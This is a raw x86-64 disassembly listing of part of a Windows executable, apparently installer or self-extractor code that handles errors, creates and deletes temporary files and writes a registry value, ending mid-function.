   140005f18:	48 ff 15 a1 32 00 00 	rex.W call *0x32a1(%rip)        # 0x1400091c0
   140005f1f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005f24:	85 c0                	test   %eax,%eax
   140005f26:	75 2d                	jne    0x140005f55
   140005f28:	8b 15 3e 76 00 00    	mov    0x763e(%rip),%edx        # 0x14000d56c
   140005f2e:	81 c2 14 05 00 00    	add    $0x514,%edx
   140005f34:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140005f39:	45 33 c9             	xor    %r9d,%r9d
   140005f3c:	48 8b 0d e5 68 00 00 	mov    0x68e5(%rip),%rcx        # 0x14000c828
   140005f43:	45 33 c0             	xor    %r8d,%r8d
   140005f46:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140005f4d:	00 
   140005f4e:	e8 79 ee ff ff       	call   0x140004dcc
   140005f53:	33 db                	xor    %ebx,%ebx
   140005f55:	48 8b 0d 04 76 00 00 	mov    0x7604(%rip),%rcx        # 0x14000d560
   140005f5c:	48 85 c9             	test   %rcx,%rcx
   140005f5f:	74 14                	je     0x140005f75
   140005f61:	48 ff 15 a8 33 00 00 	rex.W call *0x33a8(%rip)        # 0x140009310
   140005f68:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005f6d:	48 83 25 eb 75 00 00 	andq   $0x0,0x75eb(%rip)        # 0x14000d560
   140005f74:	00 
   140005f75:	85 db                	test   %ebx,%ebx
   140005f77:	75 26                	jne    0x140005f9f
   140005f79:	39 1d 7d 76 00 00    	cmp    %ebx,0x767d(%rip)        # 0x14000d5fc
   140005f7f:	75 1e                	jne    0x140005f9f
   140005f81:	21 5c 24 28          	and    %ebx,0x28(%rsp)
   140005f85:	45 33 c9             	xor    %r9d,%r9d
   140005f88:	45 33 c0             	xor    %r8d,%r8d
   140005f8b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140005f92:	00 
   140005f93:	ba f8 04 00 00       	mov    $0x4f8,%edx
   140005f98:	33 c9                	xor    %ecx,%ecx
   140005f9a:	e8 2d ee ff ff       	call   0x140004dcc
   140005f9f:	f6 05 72 6d 00 00 01 	testb  $0x1,0x6d72(%rip)        # 0x14000cd18
   140005fa6:	75 27                	jne    0x140005fcf
   140005fa8:	f6 05 b5 7e 00 00 01 	testb  $0x1,0x7eb5(%rip)        # 0x14000de64
   140005faf:	75 1e                	jne    0x140005fcf
   140005fb1:	48 8b 0d 70 68 00 00 	mov    0x6870(%rip),%rcx        # 0x14000c828
   140005fb8:	45 33 c9             	xor    %r9d,%r9d
   140005fbb:	4c 63 c3             	movslq %ebx,%r8
   140005fbe:	ba a1 0f 00 00       	mov    $0xfa1,%edx
   140005fc3:	48 ff 15 1e 35 00 00 	rex.W call *0x351e(%rip)        # 0x1400094e8
   140005fca:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005fcf:	8b c3                	mov    %ebx,%eax
   140005fd1:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005fd6:	48 83 c4 50          	add    $0x50,%rsp
   140005fda:	5f                   	pop    %rdi
   140005fdb:	c3                   	ret
   140005fdc:	cc                   	int3
   140005fdd:	cc                   	int3
   140005fde:	cc                   	int3
   140005fdf:	cc                   	int3
   140005fe0:	cc                   	int3
   140005fe1:	cc                   	int3
   140005fe2:	cc                   	int3
   140005fe3:	cc                   	int3
   140005fe4:	48 83 ec 38          	sub    $0x38,%rsp
   140005fe8:	41 b8 24 00 00 00    	mov    $0x24,%r8d
   140005fee:	48 8d 15 cb 6c 00 00 	lea    0x6ccb(%rip),%rdx        # 0x14000ccc0
   140005ff5:	48 8d 0d 4c 39 00 00 	lea    0x394c(%rip),%rcx        # 0x140009948
   140005ffc:	e8 4f f0 ff ff       	call   0x140005050
   140006001:	83 f8 24             	cmp    $0x24,%eax
   140006004:	74 2d                	je     0x140006033
   140006006:	ba b1 04 00 00       	mov    $0x4b1,%edx
   14000600b:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140006010:	45 33 c9             	xor    %r9d,%r9d
   140006013:	45 33 c0             	xor    %r8d,%r8d
   140006016:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000601d:	00 
   14000601e:	33 c9                	xor    %ecx,%ecx
   140006020:	e8 a7 ed ff ff       	call   0x140004dcc
   140006025:	c7 05 15 75 00 00 14 	movl   $0x80070714,0x7515(%rip)        # 0x14000d544
   14000602c:	07 07 80 
   14000602f:	33 c0                	xor    %eax,%eax
   140006031:	eb 65                	jmp    0x140006098
   140006033:	8b 05 a7 6c 00 00    	mov    0x6ca7(%rip),%eax        # 0x14000cce0
   140006039:	89 05 e5 77 00 00    	mov    %eax,0x77e5(%rip)        # 0x14000d824
   14000603f:	85 c0                	test   %eax,%eax
   140006041:	75 07                	jne    0x14000604a
   140006043:	ba c6 04 00 00       	mov    $0x4c6,%edx
   140006048:	eb c1                	jmp    0x14000600b
   14000604a:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140006050:	48 8d 15 11 7e 00 00 	lea    0x7e11(%rip),%rdx        # 0x14000de68
   140006057:	48 8d 0d fa 38 00 00 	lea    0x38fa(%rip),%rcx        # 0x140009958
   14000605e:	e8 ed ef ff ff       	call   0x140005050
   140006063:	48 8d 0d e6 17 00 00 	lea    0x17e6(%rip),%rcx        # 0x140007850
   14000606a:	e8 bd 16 00 00       	call   0x14000772c
   14000606f:	85 c0                	test   %eax,%eax
   140006071:	75 20                	jne    0x140006093
   140006073:	21 44 24 28          	and    %eax,0x28(%rsp)
   140006077:	45 33 c9             	xor    %r9d,%r9d
   14000607a:	45 33 c0             	xor    %r8d,%r8d
   14000607d:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006084:	00 
   140006085:	ba c6 04 00 00       	mov    $0x4c6,%edx
   14000608a:	33 c9                	xor    %ecx,%ecx
   14000608c:	e8 3b ed ff ff       	call   0x140004dcc
   140006091:	eb 9c                	jmp    0x14000602f
   140006093:	b8 01 00 00 00       	mov    $0x1,%eax
   140006098:	48 83 c4 38          	add    $0x38,%rsp
   14000609c:	c3                   	ret
   14000609d:	cc                   	int3
   14000609e:	cc                   	int3
   14000609f:	cc                   	int3
   1400060a0:	cc                   	int3
   1400060a1:	cc                   	int3
   1400060a2:	cc                   	int3
   1400060a3:	cc                   	int3
   1400060a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400060a9:	57                   	push   %rdi
   1400060aa:	48 83 ec 30          	sub    $0x30,%rsp
   1400060ae:	45 33 c0             	xor    %r8d,%r8d
   1400060b1:	48 8d 0d b0 38 00 00 	lea    0x38b0(%rip),%rcx        # 0x140009968
   1400060b8:	33 d2                	xor    %edx,%edx
   1400060ba:	e8 91 ef ff ff       	call   0x140005050
   1400060bf:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400060c4:	8b d8                	mov    %eax,%ebx
   1400060c6:	8d 50 01             	lea    0x1(%rax),%edx
   1400060c9:	48 ff 15 f8 32 00 00 	rex.W call *0x32f8(%rip)        # 0x1400093c8
   1400060d0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400060d5:	48 8b f8             	mov    %rax,%rdi
   1400060d8:	48 85 c0             	test   %rax,%rax
   1400060db:	75 2e                	jne    0x14000610b
   1400060dd:	21 44 24 28          	and    %eax,0x28(%rsp)
   1400060e1:	45 33 c9             	xor    %r9d,%r9d
   1400060e4:	45 33 c0             	xor    %r8d,%r8d
   1400060e7:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400060ee:	00 
   1400060ef:	ba b5 04 00 00       	mov    $0x4b5,%edx
   1400060f4:	33 c9                	xor    %ecx,%ecx
   1400060f6:	e8 d1 ec ff ff       	call   0x140004dcc
   1400060fb:	e8 00 16 00 00       	call   0x140007700
   140006100:	89 05 3e 74 00 00    	mov    %eax,0x743e(%rip)        # 0x14000d544
   140006106:	e9 ca 00 00 00       	jmp    0x1400061d5
   14000610b:	44 8b c3             	mov    %ebx,%r8d
   14000610e:	48 8d 0d 53 38 00 00 	lea    0x3853(%rip),%rcx        # 0x140009968
   140006115:	48 8b d7             	mov    %rdi,%rdx
   140006118:	e8 33 ef ff ff       	call   0x140005050
   14000611d:	85 c0                	test   %eax,%eax
   14000611f:	75 39                	jne    0x14000615a
   140006121:	21 44 24 28          	and    %eax,0x28(%rsp)
   140006125:	45 33 c9             	xor    %r9d,%r9d
   140006128:	45 33 c0             	xor    %r8d,%r8d
   14000612b:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006132:	00 
   140006133:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140006138:	33 c9                	xor    %ecx,%ecx
   14000613a:	e8 8d ec ff ff       	call   0x140004dcc
   14000613f:	48 8b cf             	mov    %rdi,%rcx
   140006142:	48 ff 15 27 31 00 00 	rex.W call *0x3127(%rip)        # 0x140009270
   140006149:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000614e:	c7 05 ec 73 00 00 14 	movl   $0x80070714,0x73ec(%rip)        # 0x14000d544
   140006155:	07 07 80 
   140006158:	eb 7b                	jmp    0x1400061d5
   14000615a:	48 8d 15 47 37 00 00 	lea    0x3747(%rip),%rdx        # 0x1400098a8
   140006161:	48 8b cf             	mov    %rdi,%rcx
   140006164:	48 ff 15 65 32 00 00 	rex.W call *0x3265(%rip)        # 0x1400093d0
   14000616b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006170:	85 c0                	test   %eax,%eax
   140006172:	75 16                	jne    0x14000618a
   140006174:	48 8b cf             	mov    %rdi,%rcx
   140006177:	48 ff 15 f2 30 00 00 	rex.W call *0x30f2(%rip)        # 0x140009270
   14000617e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006183:	b8 01 00 00 00       	mov    $0x1,%eax
   140006188:	eb 4d                	jmp    0x1400061d7
   14000618a:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140006191:	00 
   140006192:	45 33 c9             	xor    %r9d,%r9d
   140006195:	4c 8b c7             	mov    %rdi,%r8
   140006198:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   14000619f:	00 
   1400061a0:	ba e9 03 00 00       	mov    $0x3e9,%edx
   1400061a5:	33 c9                	xor    %ecx,%ecx
   1400061a7:	e8 20 ec ff ff       	call   0x140004dcc
   1400061ac:	48 8b cf             	mov    %rdi,%rcx
   1400061af:	8b d8                	mov    %eax,%ebx
   1400061b1:	48 ff 15 b8 30 00 00 	rex.W call *0x30b8(%rip)        # 0x140009270
   1400061b8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400061bd:	83 fb 06             	cmp    $0x6,%ebx
   1400061c0:	75 09                	jne    0x1400061cb
   1400061c2:	83 25 7b 73 00 00 00 	andl   $0x0,0x737b(%rip)        # 0x14000d544
   1400061c9:	eb b8                	jmp    0x140006183
   1400061cb:	c7 05 6f 73 00 00 c7 	movl   $0x800704c7,0x736f(%rip)        # 0x14000d544
   1400061d2:	04 07 80 
   1400061d5:	33 c0                	xor    %eax,%eax
   1400061d7:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400061dc:	48 83 c4 30          	add    $0x30,%rsp
   1400061e0:	5f                   	pop    %rdi
   1400061e1:	c3                   	ret
   1400061e2:	cc                   	int3
   1400061e3:	cc                   	int3
   1400061e4:	cc                   	int3
   1400061e5:	cc                   	int3
   1400061e6:	cc                   	int3
   1400061e7:	cc                   	int3
   1400061e8:	cc                   	int3
   1400061e9:	cc                   	int3
   1400061ea:	cc                   	int3
   1400061eb:	cc                   	int3
   1400061ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400061f1:	57                   	push   %rdi
   1400061f2:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   1400061f9:	48 8b 05 08 5e 00 00 	mov    0x5e08(%rip),%rax        # 0x14000c008
   140006200:	48 33 c4             	xor    %rsp,%rax
   140006203:	48 89 84 24 50 01 00 	mov    %rax,0x150(%rsp)
   14000620a:	00 
   14000620b:	48 8b 1d f6 73 00 00 	mov    0x73f6(%rip),%rbx        # 0x14000d608
   140006212:	eb 5a                	jmp    0x14000626e
   140006214:	83 3d e9 6a 00 00 00 	cmpl   $0x0,0x6ae9(%rip)        # 0x14000cd04
   14000621b:	48 8b fb             	mov    %rbx,%rdi
   14000621e:	75 2c                	jne    0x14000624c
   140006220:	83 3d 39 7c 00 00 00 	cmpl   $0x0,0x7c39(%rip)        # 0x14000de60
   140006227:	75 23                	jne    0x14000624c
   140006229:	48 8b 0b             	mov    (%rbx),%rcx
   14000622c:	ba 80 00 00 00       	mov    $0x80,%edx
   140006231:	48 ff 15 20 30 00 00 	rex.W call *0x3020(%rip)        # 0x140009258
   140006238:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000623d:	48 8b 0b             	mov    (%rbx),%rcx
   140006240:	48 ff 15 d9 2f 00 00 	rex.W call *0x2fd9(%rip)        # 0x140009220
   140006247:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000624c:	48 8b 0f             	mov    (%rdi),%rcx
   14000624f:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140006253:	48 ff 15 16 30 00 00 	rex.W call *0x3016(%rip)        # 0x140009270
   14000625a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000625f:	48 8b cf             	mov    %rdi,%rcx
   140006262:	48 ff 15 07 30 00 00 	rex.W call *0x3007(%rip)        # 0x140009270
   140006269:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000626e:	48 85 db             	test   %rbx,%rbx
   140006271:	75 a1                	jne    0x140006214
   140006273:	8b 05 87 6a 00 00    	mov    0x6a87(%rip),%eax        # 0x14000cd00
   140006279:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000627e:	85 c0                	test   %eax,%eax
   140006280:	0f 84 91 00 00 00    	je     0x140006317
   140006286:	83 3d 77 6a 00 00 00 	cmpl   $0x0,0x6a77(%rip)        # 0x14000cd04
   14000628d:	0f 85 84 00 00 00    	jne    0x140006317
   140006293:	83 3d c6 7b 00 00 00 	cmpl   $0x0,0x7bc6(%rip)        # 0x14000de60
   14000629a:	75 7b                	jne    0x140006317
   14000629c:	4c 8d 05 6d 73 00 00 	lea    0x736d(%rip),%r8        # 0x14000d610
   1400062a3:	ba 04 01 00 00       	mov    $0x104,%edx
   1400062a8:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400062ad:	4c 2b c0             	sub    %rax,%r8
   1400062b0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400062b5:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400062bc:	48 85 c0             	test   %rax,%rax
   1400062bf:	74 12                	je     0x1400062d3
   1400062c1:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400062c5:	84 c0                	test   %al,%al
   1400062c7:	74 0a                	je     0x1400062d3
   1400062c9:	88 01                	mov    %al,(%rcx)
   1400062cb:	48 03 cb             	add    %rbx,%rcx
   1400062ce:	48 2b d3             	sub    %rbx,%rdx
   1400062d1:	75 e2                	jne    0x1400062b5
   1400062d3:	48 85 d2             	test   %rdx,%rdx
   1400062d6:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400062da:	48 0f 45 c1          	cmovne %rcx,%rax
   1400062de:	f6 05 7f 7b 00 00 20 	testb  $0x20,0x7b7f(%rip)        # 0x14000de64
   1400062e5:	c6 00 00             	movb   $0x0,(%rax)
   1400062e8:	74 0a                	je     0x1400062f4
   1400062ea:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400062ef:	e8 4c 19 00 00       	call   0x140007c40
   1400062f4:	48 8d 0d d5 34 00 00 	lea    0x34d5(%rip),%rcx        # 0x1400097d0
   1400062fb:	48 ff 15 1e 30 00 00 	rex.W call *0x301e(%rip)        # 0x140009320
   140006302:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006307:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000630c:	e8 3b bd ff ff       	call   0x14000204c
   140006311:	8b 05 e9 69 00 00    	mov    0x69e9(%rip),%eax        # 0x14000cd00
   140006317:	66 39 1d 5a 7b 00 00 	cmp    %bx,0x7b5a(%rip)        # 0x14000de78
   14000631e:	74 67                	je     0x140006387
   140006320:	85 c0                	test   %eax,%eax
   140006322:	74 63                	je     0x140006387
   140006324:	80 3d a5 64 00 00 00 	cmpb   $0x0,0x64a5(%rip)        # 0x14000c7d0
   14000632b:	74 5a                	je     0x140006387
   14000632d:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140006332:	41 b9 06 00 02 00    	mov    $0x20006,%r9d
   140006338:	45 33 c0             	xor    %r8d,%r8d
   14000633b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006340:	48 8d 15 41 5d 00 00 	lea    0x5d41(%rip),%rdx        # 0x14000c088
   140006347:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   14000634e:	48 ff 15 e3 2d 00 00 	rex.W call *0x2de3(%rip)        # 0x140009138
   140006355:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000635a:	85 c0                	test   %eax,%eax
   14000635c:	75 29                	jne    0x140006387
   14000635e:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006363:	48 8d 15 66 64 00 00 	lea    0x6466(%rip),%rdx        # 0x14000c7d0
   14000636a:	48 ff 15 bf 2d 00 00 	rex.W call *0x2dbf(%rip)        # 0x140009130
   140006371:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006376:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000637b:	48 ff 15 06 2e 00 00 	rex.W call *0x2e06(%rip)        # 0x140009188
   140006382:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006387:	83 25 72 69 00 00 00 	andl   $0x0,0x6972(%rip)        # 0x14000cd00
   14000638e:	48 8b 8c 24 50 01 00 	mov    0x150(%rsp),%rcx
   140006395:	00 
   140006396:	48 33 cc             	xor    %rsp,%rcx
   140006399:	e8 d2 20 00 00       	call   0x140008470
   14000639e:	48 8b 9c 24 70 01 00 	mov    0x170(%rsp),%rbx
   1400063a5:	00 
   1400063a6:	48 81 c4 60 01 00 00 	add    $0x160,%rsp
   1400063ad:	5f                   	pop    %rdi
   1400063ae:	c3                   	ret
   1400063af:	cc                   	int3
   1400063b0:	cc                   	int3
   1400063b1:	cc                   	int3
   1400063b2:	cc                   	int3
   1400063b3:	cc                   	int3
   1400063b4:	cc                   	int3
   1400063b5:	cc                   	int3
   1400063b6:	cc                   	int3
   1400063b7:	cc                   	int3
   1400063b8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400063bd:	55                   	push   %rbp
   1400063be:	56                   	push   %rsi
   1400063bf:	57                   	push   %rdi
   1400063c0:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   1400063c7:	48 8b 05 3a 5c 00 00 	mov    0x5c3a(%rip),%rax        # 0x14000c008
   1400063ce:	48 33 c4             	xor    %rsp,%rax
   1400063d1:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   1400063d8:	00 
   1400063d9:	33 db                	xor    %ebx,%ebx
   1400063db:	48 8b fa             	mov    %rdx,%rdi
   1400063de:	8b f3                	mov    %ebx,%esi
   1400063e0:	48 8b e9             	mov    %rcx,%rbp
   1400063e3:	44 8b ce             	mov    %esi,%r9d
   1400063e6:	4c 8d 05 83 35 00 00 	lea    0x3583(%rip),%r8        # 0x140009970
   1400063ed:	ba 04 01 00 00       	mov    $0x104,%edx
   1400063f2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400063f7:	e8 50 ad ff ff       	call   0x14000114c
   1400063fc:	4c 8b c5             	mov    %rbp,%r8
   1400063ff:	ba 04 01 00 00       	mov    $0x104,%edx
   140006404:	48 8b cf             	mov    %rdi,%rcx
   140006407:	ff c6                	inc    %esi
   140006409:	e8 fa ab ff ff       	call   0x140001008
   14000640e:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140006413:	ba 04 01 00 00       	mov    $0x104,%edx
   140006418:	48 8b cf             	mov    %rdi,%rcx
   14000641b:	e8 88 17 00 00       	call   0x140007ba8
   140006420:	48 8b cf             	mov    %rdi,%rcx
   140006423:	48 ff 15 4e 2e 00 00 	rex.W call *0x2e4e(%rip)        # 0x140009278
   14000642a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000642f:	48 8b cf             	mov    %rdi,%rcx
   140006432:	48 ff 15 cf 2d 00 00 	rex.W call *0x2dcf(%rip)        # 0x140009208
   140006439:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000643e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006441:	74 73                	je     0x1400064b6
   140006443:	81 fe 90 01 00 00    	cmp    $0x190,%esi
   140006449:	7c 98                	jl     0x1400063e3
   14000644b:	4c 8b cf             	mov    %rdi,%r9
   14000644e:	48 8d 15 27 35 00 00 	lea    0x3527(%rip),%rdx        # 0x14000997c
   140006455:	45 33 c0             	xor    %r8d,%r8d
   140006458:	48 8b cd             	mov    %rbp,%rcx
   14000645b:	48 ff 15 3e 2f 00 00 	rex.W call *0x2f3e(%rip)        # 0x1400093a0
   140006462:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006467:	85 c0                	test   %eax,%eax
   140006469:	74 25                	je     0x140006490
   14000646b:	48 8b cf             	mov    %rdi,%rcx
   14000646e:	bb 01 00 00 00       	mov    $0x1,%ebx
   140006473:	48 ff 15 a6 2d 00 00 	rex.W call *0x2da6(%rip)        # 0x140009220
   14000647a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000647f:	33 d2                	xor    %edx,%edx
   140006481:	48 8b cf             	mov    %rdi,%rcx
   140006484:	48 ff 15 05 2e 00 00 	rex.W call *0x2e05(%rip)        # 0x140009290
   14000648b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006490:	8b c3                	mov    %ebx,%eax
   140006492:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140006499:	00 
   14000649a:	48 33 cc             	xor    %rsp,%rcx
   14000649d:	e8 ce 1f 00 00       	call   0x140008470
   1400064a2:	48 8b 9c 24 70 01 00 	mov    0x170(%rsp),%rbx
   1400064a9:	00 
   1400064aa:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   1400064b1:	5f                   	pop    %rdi
   1400064b2:	5e                   	pop    %rsi
   1400064b3:	5d                   	pop    %rbp
   1400064b4:	c3                   	ret
   1400064b5:	cc                   	int3
   1400064b6:	33 d2                	xor    %edx,%edx
   1400064b8:	48 8b cf             	mov    %rdi,%rcx
   1400064bb:	48 ff 15 ce 2d 00 00 	rex.W call *0x2dce(%rip)        # 0x140009290
   1400064c2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400064c7:	85 c0                	test   %eax,%eax
   1400064c9:	74 80                	je     0x14000644b
   1400064cb:	c7 05 2b 68 00 00 01 	movl   $0x1,0x682b(%rip)        # 0x14000cd00
   1400064d2:	00 00 00 
   1400064d5:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400064da:	eb b4                	jmp    0x140006490
   1400064dc:	cc                   	int3
   1400064dd:	cc                   	int3
   1400064de:	cc                   	int3
   1400064df:	cc                   	int3
   1400064e0:	cc                   	int3
   1400064e1:	cc                   	int3
   1400064e2:	cc                   	int3
   1400064e3:	cc                   	int3
   1400064e4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400064e9:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400064ee:	57                   	push   %rdi
   1400064ef:	48 81 ec 70 01 00 00 	sub    $0x170,%rsp
   1400064f6:	48 8b 05 0b 5b 00 00 	mov    0x5b0b(%rip),%rax        # 0x14000c008
   1400064fd:	48 33 c4             	xor    %rsp,%rax
   140006500:	48 89 84 24 60 01 00 	mov    %rax,0x160(%rsp)
   140006507:	00 
   140006508:	41 8b f0             	mov    %r8d,%esi
   14000650b:	4c 8b c9             	mov    %rcx,%r9
   14000650e:	85 d2                	test   %edx,%edx
   140006510:	0f 84 c9 00 00 00    	je     0x1400065df
   140006516:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000651b:	e8 98 fe ff ff       	call   0x1400063b8
   140006520:	85 c0                	test   %eax,%eax
   140006522:	0f 84 60 01 00 00    	je     0x140006688
   140006528:	48 8d 1d e1 70 00 00 	lea    0x70e1(%rip),%rbx        # 0x14000d610
   14000652f:	bf 04 01 00 00       	mov    $0x104,%edi
   140006534:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140006539:	8b d7                	mov    %edi,%edx
   14000653b:	48 8b cb             	mov    %rbx,%rcx
   14000653e:	4c 2b c3             	sub    %rbx,%r8
   140006541:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140006548:	48 85 c0             	test   %rax,%rax
   14000654b:	74 13                	je     0x140006560
   14000654d:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140006551:	84 c0                	test   %al,%al
   140006553:	74 0b                	je     0x140006560
   140006555:	88 01                	mov    %al,(%rcx)
   140006557:	48 ff c1             	inc    %rcx
   14000655a:	48 83 ea 01          	sub    $0x1,%rdx
   14000655e:	75 e1                	jne    0x140006541
   140006560:	48 85 d2             	test   %rdx,%rdx
   140006563:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140006567:	48 0f 45 c1          	cmovne %rcx,%rax
   14000656b:	c6 00 00             	movb   $0x0,(%rax)
   14000656e:	f6 05 ef 78 00 00 20 	testb  $0x20,0x78ef(%rip)        # 0x14000de64
   140006575:	74 55                	je     0x1400065cc
   140006577:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000657c:	48 ff 15 dd 2d 00 00 	rex.W call *0x2ddd(%rip)        # 0x140009360
   140006583:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006588:	0f b7 4c 24 20       	movzwl 0x20(%rsp),%ecx
   14000658d:	85 c9                	test   %ecx,%ecx
   14000658f:	74 2a                	je     0x1400065bb
   140006591:	83 e9 01             	sub    $0x1,%ecx
   140006594:	74 1c                	je     0x1400065b2
   140006596:	83 e9 01             	sub    $0x1,%ecx
   140006599:	74 0e                	je     0x1400065a9
   14000659b:	83 f9 01             	cmp    $0x1,%ecx
   14000659e:	75 2c                	jne    0x1400065cc
   1400065a0:	4c 8d 05 f1 33 00 00 	lea    0x33f1(%rip),%r8        # 0x140009998
   1400065a7:	eb 19                	jmp    0x1400065c2
   1400065a9:	4c 8d 05 e0 33 00 00 	lea    0x33e0(%rip),%r8        # 0x140009990
   1400065b0:	eb 10                	jmp    0x1400065c2
   1400065b2:	4c 8d 05 cf 33 00 00 	lea    0x33cf(%rip),%r8        # 0x140009988
   1400065b9:	eb 07                	jmp    0x1400065c2
   1400065bb:	4c 8d 05 be 33 00 00 	lea    0x33be(%rip),%r8        # 0x140009980
   1400065c2:	8b d7                	mov    %edi,%edx
   1400065c4:	48 8b cb             	mov    %rbx,%rcx
   1400065c7:	e8 dc 15 00 00       	call   0x140007ba8
   1400065cc:	4c 8d 05 2d 31 00 00 	lea    0x312d(%rip),%r8        # 0x140009700
   1400065d3:	8b d7                	mov    %edi,%edx
   1400065d5:	48 8b cb             	mov    %rbx,%rcx
   1400065d8:	e8 cb 15 00 00       	call   0x140007ba8
   1400065dd:	eb 3f                	jmp    0x14000661e
   1400065df:	48 8d 1d 2a 70 00 00 	lea    0x702a(%rip),%rbx        # 0x14000d610
   1400065e6:	bf 04 01 00 00       	mov    $0x104,%edi
   1400065eb:	48 8b cb             	mov    %rbx,%rcx
   1400065ee:	4c 2b cb             	sub    %rbx,%r9
   1400065f1:	48 8d 87 fa fe ff 7f 	lea    0x7ffffefa(%rdi),%rax
   1400065f8:	48 85 c0             	test   %rax,%rax
   1400065fb:	74 13                	je     0x140006610
   1400065fd:	41 8a 04 09          	mov    (%r9,%rcx,1),%al
   140006601:	84 c0                	test   %al,%al
   140006603:	74 0b                	je     0x140006610
   140006605:	88 01                	mov    %al,(%rcx)
   140006607:	48 ff c1             	inc    %rcx
   14000660a:	48 83 ef 01          	sub    $0x1,%rdi
   14000660e:	75 e1                	jne    0x1400065f1
   140006610:	48 85 ff             	test   %rdi,%rdi
   140006613:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140006617:	48 0f 45 c1          	cmovne %rcx,%rax
   14000661b:	c6 00 00             	movb   $0x0,(%rax)
   14000661e:	48 8b cb             	mov    %rbx,%rcx
   140006621:	e8 4a 05 00 00       	call   0x140006b70
   140006626:	85 c0                	test   %eax,%eax
   140006628:	75 1f                	jne    0x140006649
   14000662a:	33 d2                	xor    %edx,%edx
   14000662c:	48 8b cb             	mov    %rbx,%rcx
   14000662f:	48 ff 15 5a 2c 00 00 	rex.W call *0x2c5a(%rip)        # 0x140009290
   140006636:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000663b:	85 c0                	test   %eax,%eax
   14000663d:	74 3e                	je     0x14000667d
   14000663f:	c7 05 b7 66 00 00 01 	movl   $0x1,0x66b7(%rip)        # 0x14000cd00
   140006646:	00 00 00 
   140006649:	85 f6                	test   %esi,%esi
   14000664b:	74 3f                	je     0x14000668c
   14000664d:	45 33 c0             	xor    %r8d,%r8d
   140006650:	8b d6                	mov    %esi,%edx
   140006652:	48 8b cb             	mov    %rbx,%rcx
   140006655:	e8 4a 06 00 00       	call   0x140006ca4
